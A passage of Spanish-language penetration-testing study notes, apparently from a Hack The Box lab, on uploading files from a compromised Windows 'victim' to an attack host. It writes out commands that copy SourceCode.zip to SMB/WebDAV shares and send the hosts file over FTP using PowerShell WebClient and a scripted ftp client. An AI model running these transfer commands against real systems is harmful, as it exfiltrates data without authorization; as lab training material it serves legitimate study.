C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\

C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
>[!Nota]
>
>Si no hay restricciones SMB, se puede usar **impacket-smbserver** de la misma manera que lo configuramos para las operaciones de descarga.


## 5.- Subidas FTP
Subir archivos mediante FTP es ==muy similar a descargarlos==. Podemos usar PowerShell o el cliente FTP para completar la operación. Antes de iniciar nuestro servidor FTP mediante el módulo Python **pyftpdlib**, debemos especificar la opción `--write` **para permitir que los clientes suban archivos a nuestro host de ataque**.

```shell
sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

Ahora podemos subir el archivo desde la máquina víctima:
```powershell
C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```


### Crear un archivo de comandos para que el cliente FTP cargue un archivo
```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt

C:\htb> echo USER anonymous >> ftpcommand.txt

C:\htb> echo binary >> ftpcommand.txt

C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt

C:\htb> echo bye >> ftpcommand.txt

C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```